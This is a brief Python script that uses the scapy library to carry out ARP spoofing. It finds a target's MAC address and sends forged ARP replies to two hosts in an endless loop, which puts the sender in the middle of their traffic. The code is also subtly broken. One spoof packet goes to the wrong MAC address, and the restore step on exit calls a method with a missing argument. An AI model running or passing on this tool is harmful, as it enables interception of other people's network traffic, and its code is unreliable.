import scapy.all as sc
import time

class Mac():

    def Findmac(self,target_ip):
        arp_request = sc.ARP(pdst=target_ip)
        brodcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined = brodcast/arp_request
        answered = sc.srp(combined,timeout=1,verbose=False)[0]
        return answered[0][1].hwsrc

    def Arp_response(self,target_ip,target_mac,source_ip):
        arp_response = sc.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=source_ip)
        sc.send(arp_response,verbose=False)

    def Cancel_arp(self,target_ip,target_mac,source_ip):
        source_mac = self.Findmac(source_ip)

        arp_response = sc.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=source_ip,hwsrc=source_mac)
        sc.send(arp_response,verbose=False,count=5)


    def arp_spf(self,ip,source):

        target_mac = self.Findmac(ip)
        temp = 0
        try:
            while True:
                self.Arp_response(ip,target_mac,source)
                self.Arp_response(source,target_mac,ip)
                temp +=2
                print("\rsendin packets" + str(temp),end="")
                time.sleep(3)
        except KeyboardInterrupt:
            self.Cancel_arp(ip,source)
            self.Cancel_arp(source,ip)
            print("\nexit program...")